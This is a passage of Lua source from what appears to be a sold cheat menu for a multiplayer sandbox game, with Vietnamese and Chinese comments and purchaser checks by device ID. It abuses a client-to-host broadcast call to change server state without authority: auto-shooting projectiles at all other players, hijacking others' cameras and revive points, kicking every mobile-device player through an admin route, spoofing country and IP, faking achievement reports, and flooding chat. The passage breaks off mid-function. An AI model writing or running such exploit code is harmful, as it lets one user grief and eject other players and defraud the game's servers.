                        if sector == 0 then red, green, blue = value, t, p
                        elseif sector == 1 then red, green, blue = q, value, p
                        elseif sector == 2 then red, green, blue = p, value, t
                        elseif sector == 3 then red, green, blue = p, q, value
                        elseif sector == 4 then red, green, blue = t, p, value
                        else red, green, blue = value, p, q
                        end

                        return math.floor(red * 255 + 0.5), math.floor(green * 255 + 0.5), math.floor(blue * 255 + 0.5)
                    end

                    local function rgbToHex(red, green, blue)
                        return string.format("%02x%02x%02x", red, green, blue)
                    end

                    local function createSmoothRainbow(str, baseHue)
                        local characters = splitUtf8(str)
                        local result = {}
                        local letterIndex = 0

                        for _, character in ipairs(characters) do
                            if character == " " then
                                table.insert(result, character)
                            else
                                local hue = (baseHue + letterIndex * 0.08) % 1
                                local red, green, blue = hsvToRgb(hue, 1, 1)
                                table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                letterIndex = letterIndex + 1
                            end
                        end
                        return table.concat(result)
                    end

                    -- Cấu hình tọa độ hiển thị
                    local imageDir = { x = 0, y = 50, z = 0 }
                    local textDir = { x = 0, y = 30, z = 0 }
                    local textOffset = 10
                    local textX2, textY2 = 0, 0

                    local graphicsImageInfo = {
                        imgid = 10099,
                        scale = 0.7,
                        apha = 90,
                        id = 1,
                        Type = 'GRAPHICS.GRAPHICS_IMAGE'
                    }

                    local tdataImage = {
                        [1] = "graphics",
                        [2] = "createGraphicsImageByActor",
                        [3] = {
                            myUin,
                            graphicsImageInfo,
                            imageDir,
                            1,
                            0,
                            150
                        }
                    }

                    ShowGameTipsWithoutFilter("#c00ffffĐã bật hiệu ứng chữ cầu vồng!")

                    -- Vòng lặp đổi màu
                    threadpool:work(function()
                        local baseHue = 0

                        while _G.rainbow_name_enabled and currentGeneration == _G.rainbow_name_generation do
                            local graphicsInfo = {
                                apha = 1,
                                Type = 1,
                                title = createSmoothRainbow(nickname, baseHue),
                                autoWrap = 2,
                                itype = 1,
                                fontsize = 100
                            }

                            local tdataText = {
                                [1] = "graphics",
                                [2] = "createGraphicsTxtByActor",
                                [3] = {
                                    myUin,
                                    graphicsInfo,
                                    textDir,
                                    textOffset,
                                    textX2,
                                    textY2
                                }
                            }

                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataImage)
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataText)
                            end)

                            baseHue = (baseHue + 0.01) % 1
                            threadpool:wait(0.03)
                        end
                    end)
                end)
            end
        end
    )
end

function pctv11()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt (Bên trái: Tắt, Bên phải: Bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Dừng hoàn toàn hiệu ứng chữ trên đầu
                _G.custom_title_enabled = false
                ShowGameTipsWithoutFilter("#cff0000Đã tắt hiệu ứng chữ trên đầu!")
                
            elseif btnType == 1 then
                -- Nút BẬT (Bên phải) -> Hiển thị bảng nhập văn bản
                ShowTextInputSafe(function(text)
                    if not text or text == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập nội dung văn bản hợp lệ")
                        return
                    end

                    _G.custom_title_generation = (_G.custom_title_generation or 0) + 1
                    local currentGeneration = _G.custom_title_generation
                    _G.custom_title_enabled = true

                    -- Lấy UIN của chính bản thân
                    local myUin = nil
                    if CurMainPlayer and CurMainPlayer.getUin then
                        pcall(function()
                            myUin = CurMainPlayer:getUin()
                        end)
                    end
                    
                    if not myUin then
                        myUin = AccountManager:getUin()
                    end

                    -- Giữ nguyên nội dung người dùng nhập kèm khoảng trắng căn đối
                    local nickname = text .. "           "
                    local customTitle = nickname

                    -- Cấu hình tọa độ hiển thị chữ
                    local dir = {
                        x = 0,
                        y = 20,
                        z = 0
                    }
                    local textOffset = 10
                    local textX2, textY2 = 0, 0

                    local graphicsInfo = {
                        apha = 1,
                        Type = 1,
                        title = customTitle,
                        autoWrap = 2,
                        itype = 1,
                        fontsize = 100
                    }

                    local tdataText = {
                        [1] = "graphics",
                        [2] = "createGraphicsTxtByActor",
                        [3] = {
                            myUin,
                            graphicsInfo,
                            dir,
                            textOffset,
                            textX2,
                            textY2
                        }
                    }

                    ShowGameTipsWithoutFilter("#cff0000Đã kích hoạt thành công - Đang hiển thị chữ trên đầu...")

                    -- Vòng lặp duy trì chữ hiển thị trên đầu bản thân
                    threadpool:work(function()
                        while _G.custom_title_enabled and currentGeneration == _G.custom_title_generation do
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataText)
                            end)
                            
                            threadpool:wait(1)
                        end
                    end)
                end)
            end
        end
    )
end

function pctv12()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt (Bên trái: Tắt, Bên phải: Bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Nhập id để bắn vật ném hướng về mục tiêu\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Dừng vòng lặp tự động bắn
                _G.auto_shoot_enabled = false
                ShowGameTipsWithoutFilter("#cff0000Đã TẮT Tự Động Bắn!")
                
            elseif btnType == 1 then
                -- Nút BẬT (Bên phải) -> Hiển thị bảng nhập ID vật ném
                ShowTextInputSafe(function(text)
                    if not text or text == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập ID vật phẩm có thể ném hợp lệ")
                        return
                    end

                    local projectileId = tonumber(text)
                    if not projectileId then
                        ShowGameTipsWithoutFilter("ID của vật thể ném được phải là một con số")
                        return
                    end

                    _G.auto_shoot_generation = (_G.auto_shoot_generation or 0) + 1
                    local currentGeneration = _G.auto_shoot_generation
                    _G.auto_shoot_enabled = true

                    local myUin = AccountManager:getUin()

                    -- Mở luồng chạy ngầm bằng threadpool
                    threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT Tự Động Bắn! ID vật ném: " .. projectileId)

                        while _G.auto_shoot_enabled and currentGeneration == _G.auto_shoot_generation do
                            -- Lấy lại danh sách player và tọa độ bản thân trong mỗi vòng lặp
                            local ok, playerCount = pcall(function()
                                return ClientCurGame:requireArrayOfAllPlayers()
                            end)

                            if ok and type(playerCount) == "number" then
                                local _, center_x, center_y, center_z = pcall(function()
                                    return CurMainPlayer:getPosition(0, 0, 0)
                                end)

                                for i = 1, playerCount do
                                    if not _G.auto_shoot_enabled or currentGeneration ~= _G.auto_shoot_generation then break end

                                    local player = ClientCurGame:getIthPlayerInArray(i - 1)

                                    if player then
                                        local targetUin = player:getUin()
                                        
                                        -- ========================================================
                                        -- KIỂM TRA: Không phải bản thân VÀ KHÔNG nằm trong danh sách trắng chung
                                        -- ========================================================
                                        if targetUin and targetUin ~= myUin and not (whitelist and whitelist[targetUin]) then

                                            local posOk, rawX, rawY, rawZ = pcall(function()
                                                return player:getPosition(0, 0, 0)
                                            end)

                                            if posOk and rawX and rawY and rawZ then
                                                local target_x = rawX / 100
                                                local target_y = rawY / 100
                                                local target_z = rawZ / 100

                                                local tdata = {
                                                    [1] = "world",
                                                    [2] = "spawnProjectile",
                                                    [3] = {
                                                        myUin,
                                                        projectileId,

                                                        center_x / 100,
                                                        center_y / 100 + 2,
                                                        center_z / 100,

                                                        target_x,
                                                        target_y,
                                                        target_z,

                                                        500
                                                    }
                                                }

                                                pcall(function()
                                                    ScriptSupportTask:reportTaskToHost(
                                                        SSTASKID.HOST_BordCast,
                                                        tdata
                                                    )
                                                end)
                                            end
                                        end
                                    end
                                end
                            end

                            -- Thời gian chờ giữa các lần xả đạn (0.1 giây)
                            threadpool:wait(0.1)
                        end
                    end)
                end)
            end
        end
    )
end

function pctv13()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hiển thị ngay bảng nhập giá trị thời tiết
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị ID thời tiết hợp lệ")
            return
        end

        local weatherId = tonumber(text)
        if not weatherId then
            ShowGameTipsWithoutFilter("Giá trị thời tiết phải là một con số từ 1 tới 8~")
            return
        end

        -- Cấu trúc gói tin thay đổi thời tiết theo giá trị vừa nhập
        local tdata = {
            [1] = "gamerule",
            [2] = "setWeather",
            [3] = { weatherId }
        }

        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)

        ShowGameTipsWithoutFilter("#c00ffffĐã đổi thời tiết sang ID: " .. weatherId)
    end)
end

function pctv14()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hiển thị ngay bảng nhập giá trị trọng lực
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị số trọng lực hợp lệ")
            return
        end

        local gravityValue = tonumber(text)
        if not gravityValue then
            ShowGameTipsWithoutFilter("Giá trị trọng lực phải là một con số từ 1 tới 0.1~")
            return
        end

        -- Cấu trúc gói tin thay đổi hệ số trọng lực theo giá trị vừa nhập
        local tdata = {
            [1] = "gamerule",
            [2] = "setGravityFactor",
            [3] = { gravityValue }
        }

        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)

        ShowGameTipsWithoutFilter("#c00ffffĐã đổi trọng lực thành: " .. gravityValue)
    end)
end

function pctv15()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hiển thị ngay bảng nhập số giờ
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị số hợp lệ (0-24)")
            return
        end

        local hoursValue = tonumber(text)
        if not hoursValue then
            ShowGameTipsWithoutFilter("Thời gian phải là một con số")
            return
        end

        -- Cấu trúc gói tin thay đổi giờ trong ngày
        local tdata = {
            [1] = "world",
            [2] = "setHours",
            [3] = { hoursValue }
        }

        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)

        ShowGameTipsWithoutFilter("#c00ffffĐã đặt thời gian thành: " .. hoursValue .. " giờ")
    end)
end

function pctv16()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    -- Đóng giao diện menu hiện tại
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật/Nhập (Bên phải) và Tắt (Bên trái)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái: Dừng chat cầu vồng\nBên phải: Nhập nội dung chat cầu vồng tùy chỉnh",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Ngắt luồng chạy cầu vồng
                _G.chat_rainbow_enabled = false
                _G.chat_rainbow_gen = (_G.chat_rainbow_gen or 0) + 1
                ShowGameTipsWithoutFilter("#c00ffffĐã TẮT Chat Cầu Vồng!")
                
            elseif btnType == 1 then
                -- Nút NHẬP VĂN BẢN (Bên phải) -> Hiện bảng nhập nội dung chat
                ShowTextInputSafe(function(text)
                    if not text or text == "" then
                        ShowGameTipsWithoutFilter("#cff0000Bạn chưa nhập nội dung gì cả!", 3)
                        return
                    end

                    -- Ngắt luồng cũ nếu đang chạy để tránh đè luồng
                    _G.chat_rainbow_enabled = false
                    _G.chat_rainbow_gen = (_G.chat_rainbow_gen or 0) + 1
                    
                    -- Chờ một nhịp nhỏ cho luồng cũ tắt hẳn
                    threadpool:wait(0.2)

                    -- Bật cờ cho phép chạy luồng mới
                    _G.chat_rainbow_enabled = true
                    local currentGen = _G.chat_rainbow_gen

                    ShowGameTipsWithoutFilter("#c00ffffĐã BẬT Chat Cầu Vồng Động với nội dung mới!")

                    -- Khởi chạy luồng ngầm xử lý hiệu ứng cầu vồng
                    threadpool:work(function()
                        -- Hàm tách ký tự UTF-8
                        local function splitUtf8(str)
                            local characters = {}
                            for character in string.gmatch(str, "[%z\1-\127\194-\244][\128-\191]*") do
                                table.insert(characters, character)
                            end
                            return characters
                        end

                        -- Chuyển HSV sang RGB
                        local function hsvToRgb(hue, saturation, value)
                            local sector = math.floor(hue * 6)
                            local fraction = hue * 6 - sector
                            local p = value * (1 - saturation)
                            local q = value * (1 - fraction * saturation)
                            local t = value * (1 - (1 - fraction) * saturation)
                            sector = sector % 6

                            local red, green, blue
                            if sector == 0 then red, green, blue = value, t, p
                            elseif sector == 1 then red, green, blue = q, value, p
                            elseif sector == 2 then red, green, blue = p, value, t
                            elseif sector == 3 then red, green, blue = p, q, value
                            elseif sector == 4 then red, green, blue = t, p, value
                            else red, green, blue = value, p, q
                            end

                            return math.floor(red * 255 + 0.5),
                                   math.floor(green * 255 + 0.5),
                                   math.floor(blue * 255 + 0.5)
                        end

                        -- Chuyển RGB sang Hex dạng RRGGBB
                        local function rgbToHex(red, green, blue)
                            return string.format("%02x%02x%02x", red, green, blue)
                        end

                        -- Tạo chuỗi văn bản mang hiệu ứng cầu vồng chuyển động từng ký tự
                        local function createSmoothRainbow(msgText, baseHue)
                            local characters = splitUtf8(msgText)
                            local result = {}
                            local letterIndex = 0

                            for _, character in ipairs(characters) do
                                if character == " " or character == "\n" then
                                    table.insert(result, character)
                                else
                                    local hue = (baseHue + letterIndex * 0.05) % 1
                                    local red, green, blue = hsvToRgb(hue, 1, 1)
                                    table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                    letterIndex = letterIndex + 1
                                end
                            end

                            return table.concat(result)
                        end

                        local baseHue = 0

                        while _G.chat_rainbow_enabled and currentGen == _G.chat_rainbow_gen do
                            local rainbowMsg = createSmoothRainbow(text, baseHue)

                            local tdata = {
                                [1] = "chat",
                                [2] = "sendChat",
                                [3] = { rainbowMsg, 1, 0 }
                            }

                            pcall(function()
                                if ScriptSupportTask and SSTASKID then
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end)

                            baseHue = (baseHue + 0.01) % 1
                            threadpool:wait(0.01)
                        end
                    end)
                end, "输入要发送的彩色文字")
            end
        end
    )
end

function pctv17()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    -- Hiển thị bảng nhập giá trị
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị số hợp lệ")
            return
        end

        local skyboxId = tonumber(text)
        if not skyboxId then
            ShowGameTipsWithoutFilter("Giá trị phải là một con số")
            return
        end

        -- Gửi lệnh cập nhật Skybox lên host
        local tdata = {
            [1] = "world",
            [2] = "SetSkyBoxMaps",
            [3] = {1, skyboxId, ""}
        }

        pcall(function() 
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
        end)

        ShowGameTipsWithoutFilter("#c00ffffĐã áp dụng Skybox ID: " .. skyboxId)
    end)
end

function pctv18()
    -- Hiển thị bảng nhập giá trị
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập mã quốc gia hợp lệ")
            return
        end

        -- Chuẩn hóa mã quốc gia thành chữ hoa (ví dụ: br -> BR)
        local country = string.upper(text)

        -- Thực hiện thiết lập quốc gia và IP
        gFunc_setCountry(country)
        gFunc_setCountryIP(country)

        -- Thông báo thành công
        ShowGameTipsWithoutFilter("Đã đổi quốc gia thành: " .. country)
    end)
end

function pctv19()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- BẢNG 1: Nhập tốc độ thời gian mong muốn
    ShowGameTipsWithoutFilter("Vui lòng nhập: Tốc độ thời gian (Ví dụ: 1 là bình thường, 0 là đứng yên, số lớn để tua nhanh)")
    ShowTextInputSafe(function(speedText)
        if not speedText or speedText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị hợp lệ")
            return
        end

        local speedValue = tonumber(speedText)
        if not speedValue then
            ShowGameTipsWithoutFilter("Tốc độ phải là một con số")
            return
        end

        -- BẢNG 2: Hộp thoại xác nhận Yes / No
        GetInst("MessageBoxInterface"):dualBtnBox(
            string.format("Xác nhận thay đổi tốc độ thời gian thành: %d?", speedValue),
            "Hủy",
            "Đồng ý",
            function(userData, btnType)
                if btnType == 1 then
                    -- Khai báo dữ liệu truyền vào với giá trị người dùng vừa nhập
                    local tdata = { 
                        "world", 
                        "SetTimeVanishingSpeed", 
                        { speedValue } 
                    }

                    -- Gọi hàm gửi dữ liệu lên Host
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    
                    ShowGameTipsWithoutFilter(string.format("#cff0000Đã đổi tốc độ thời gian thành: %d!", speedValue))
                else
                    ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                end
            end
        )
    end)
end

function pctv20()
if not _G.anti_despawn_running then
        _G.anti_despawn_running = true
        
        -- Hiển thị thông báo khi bật tính năng thành công
        ShowGameTipsWithoutFilter("#c00FF00[Anti-Despawn] Đã bật chế độ chống xóa thực thể!", 3)
        
        threadpool:work(function()
            while _G.anti_despawn_running do
                pcall(function()
                    local myUin = CPlayer:GetLocalPlayerUID()
                    if myUin then
                        local localActor = CPlayer:GetLocalPlayerActor()
                        -- Nếu phát hiện nhân vật bị mất (đã bị xóa thực thể)
                        if not localActor then
                            -- Gửi đồng thời các gói tin ép khôi phục khẩn cấp
                            local tdata1 = {
                                [1] = "player",
                                [2] = "revive",
                                [3] = { myUin }
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                            
                            local tdata2 = {
                                [1] = "actor",
                                [2] = "reborn",
                                [3] = { myUin }
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                        end
                    end
                end)
                -- Quét nhanh liên tục mỗi 0.2 giây
                threadpool:wait(0.2)
            end
        end)
    else
        ShowGameTipsWithoutFilter("#cFFFF00[Anti-Despawn] Tính năng này đang chạy rồi!", 2)
    end
end

function pctv21()
ShowGameTipsWithoutFilter("Vui lòng nhập giá trị: 1 (Khóa) hoặc 0 (Mở khóa thời gian)")
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效数字（时间值）")
            return
        end
        local tdata = {
            [1] = "gamerule",
            [2] = "setTimLocked",
            [3] = { value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end

function pctv22()
    -- Kiểm tra xem đang ở trong game không
    if not ClientCurGame or not ClientCurGame:isInGame() then
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R请先进入游戏房间", 3)
        end
        return
    end

    -- Đóng giao diện menu nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Lấy tọa độ vị trí hiện tại của bạn
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x = x / 100
    local base_y = y / 100
    local base_z = z / 100

    -- Lấy UIN của chính bạn để loại trừ
    local myUin = AccountManager:getUin()

    -- Kiểm tra và khởi tạo danh sách trắng toàn cục (whitelist)
    if whitelist == nil then
        whitelist = {}
    end

    -- Lấy danh sách UIN người chơi trong phòng
    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()

    if not uin_list or #uin_list == 0 then
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R当前房间没有其他玩家", 3)
        end
        return
    end

    local count = 0

    -- Vòng lặp duyệt qua tất cả người chơi trong phòng
    for _, uin in ipairs(uin_list) do
        -- Kiểm tra: Không phải bản thân VÀ Không nằm trong danh sách trắng
        if uin ~= myUin and not whitelist[uin] then
            local tdata = {
                [1] = "player",
                [2] = "setRevivePoint",
                [3] = { uin, base_x, base_y, base_z }
            }
            
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end)
            
            count = count + 1
        end
    end

    if ShowGameTipsWithoutFilter then
        ShowGameTipsWithoutFilter("#c00ff00Đã đặt điểm hồi sinh tại vị trí của bạn cho " .. count .. " người chơi!")
    end
end

function pctk1()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng bảng menu chính
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt (Bên trái: Tắt, Bên phải: Bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Vô hiệu hóa biến chạy và tăng Gen để hủy luồng ngay lập tức
                _G.anti_phone_enabled = false
                _G.anti_phone_generation = (_G.anti_phone_generation or 0) + 1
                ShowGameTipsWithoutFilter("#cff0000Đã tắt hoàn toàn tính năng chống điện thoại!")
                
            elseif btnType == 1 then
                -- Nút BẬT (Bên phải) -> Cập nhật Gen mới và kích hoạt
                _G.anti_phone_generation = (_G.anti_phone_generation or 0) + 1
                local currentGeneration = _G.anti_phone_generation
                _G.anti_phone_enabled = true

                ShowGameTipsWithoutFilter("#cff0000开启成功 - Đang tự động quét và chống người chơi Điện thoại...")

                -- Tiến trình quét và tự động kick người chơi điện thoại (Android/iOS)
                threadpool:work(function()
                    while _G.anti_phone_enabled and currentGeneration == _G.anti_phone_generation do
                        if CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame() then
                            local myUin = AccountManager:getUin()
                            local num = ClientCurGame:getNumPlayerBriefInfo()
                            
                            for i = 1, num do
                                -- Kiểm tra ngắt lập tức nếu người dùng bấm Tắt
                                if not _G.anti_phone_enabled or currentGeneration ~= _G.anti_phone_generation then 
                                    break 
                                end

                                local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                                if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
                                    local code, ret = BuddyManager:query_friend_info(briefInfo.uin)
                                    if code == ErrorCode.OK and ret and ret.baseinfo and ret.baseinfo.extra then
                                        local deviceSystem = tostring(ret.baseinfo.extra.DeviceSystem or ""):lower()
                                        
                                        -- Quét thiết bị Android hoặc iOS để kick
                                        if deviceSystem:find("android") or deviceSystem:find("ios") or deviceSystem:find("phone") then
                                            local targetUin = briefInfo.uin
                                            ShowGameTipsWithoutFilter("Đã phát hiện người chơi trên thiết bị di động，ID: " .. tostring(targetUin) .. "，Đang đá văng ra...")
                                            AccountManager.cluster.buddysvr.routemore('gm.kick', targetUin, 0)
                                            threadpool:wait(0.2)
                                        end
                                    end
                                end
                            end
                        end
                        
                        -- Chờ một nhịp trước khi quét vòng tiếp theo
                        threadpool:wait(1)
                    end
                end)
            end
        end
    )
end

function pctk10()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")

    -- Khởi tạo danh sách lưu các ID mục tiêu và trạng thái
    _G.black_target_list = _G.black_target_list or {}
    _G.black_target_multi_enabled = _G.black_target_multi_enabled or false

    GetInst("MessageBoxInterface"):dualBtnBox(
        "⚠️ Quản lý danh sách khóa nhiều ID ⚠️\nHiện tại đang có: " .. #_G.black_target_list .. " mục tiêu.\n\nBên trái: Dừng & Xóa sạch danh sách\nBên phải: Chọn thêm ID mới",
        "Dừng & Xóa",  -- Nút trái (btnType == 0)
        "Thêm ID",     -- Nút phải (btnType == 1)
        function(userData, btnType)
            if btnType == 0 then
                -- DỪNG VÀ XÓA SẠCH DANH SÁCH
                _G.black_target_multi_enabled = false
                _G.black_target_list = {}
                ShowGameTipsWithoutFilter("#cFF0000Đã TẮT và xóa toàn bộ danh sách khóa!")
                
            elseif btnType == 1 then
                -- MỞ BẢNG CHỌN ĐỂ THÊM ID MỚI VÀO DANH SÁCH
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn")
                        return
                    end

                    local myUin = nil
                    pcall(function() myUin = AccountManager:getUin() end)
                    if selectedUin == myUin then
                        ShowGameTipsWithoutFilter("#RKhông thể tự khóa chính mình!")
                        return
                    end

                    -- Kiểm tra danh sách trắng toàn cục (Whitelist)
                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    -- Tính toán UIN theo công thức
                    local targetUinCalc = selectedUin + 1000000000

                    -- Kiểm tra xem ID này đã có trong danh sách chưa (tránh bị trùng lặp)
                    local exists = false
                    for _, id in ipairs(_G.black_target_list) do
                        if id == targetUinCalc then
                            exists = true
                            break
                        end
                    end

                    if not exists then
                        table.insert(_G.black_target_list, targetUinCalc)
                        ShowGameTipsWithoutFilter("#c00ffffĐã thêm ID! Tổng số mục tiêu: " .. #_G.black_target_list)
                    else
                        ShowGameTipsWithoutFilter("#RID này đã có sẵn trong danh sách rồi!")
                        return
                    end

                    -- Nếu luồng chạy chưa được bật thì khởi chạy luồng quét danh sách
                    if not _G.black_target_multi_enabled then
                        _G.black_target_multi_enabled = true
                        
                        threadpool:work(function()
                            while _G.black_target_multi_enabled and #_G.black_target_list > 0 do
                                pcall(function()
                                    -- Lặp qua tất cả các UIN có trong danh sách để tác động đồng thời
                                    for _, uin in ipairs(_G.black_target_list) do
                                        local t1 = {[1] = "player", [2] = "rotateCamera", [3] = {uin, 999999999, 999999999}}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1)
                                        
                                        local t2 = {[1] = "player", [2] = "changeViewMode", [3] = {uin, 99, true}}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2)
                                    end
                                end)
                                threadpool:wait(0.05)
                            end
                            _G.black_target_multi_enabled = false
                        end)
                    end
                end, "Chọn thêm người chơi vào danh sách")
            end
        end
    )
end

function pcty1()
    -- Danh sách ID tùy chỉnh (Rxz) của bạn
    local Rxz = {
        1001, 1002, 1003, 1004, 1005, 1006, 
        1008, 1010, 1011, 1012, 1014, 1015, 
        1017, 1018, 1019, 1020
    }

    -- Vòng lặp dựa theo logic 22 lần lặp của bạn
    for dm = 1, 22 do
        local index = dm + 1  
        local id = Rxz[index]
        
        -- Kiểm tra nếu ID tồn tại trong bảng để tránh lỗi
        if id then
            pcall(function()
                ArchievementGetInstance().func:Report2Server(id, {
                    pos = 838384,
                    add = 2001,
                    count = 2001
                })
            end)
            
            -- Độ trễ nhỏ để tránh quá tải (giữ lại từ hàm đầu tiên của bạn)
            if threadpool and threadpool.wait then
                threadpool:wait(0.01)
            end
        end
    end

    -- Hiển thị thông báo hoàn tất trên màn hình game
    ShowGameTipsWithoutFilter("🏆 Đã mở khóa danh sách huy hiệu tùy chỉnh thành công!")
end

function pcty2()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
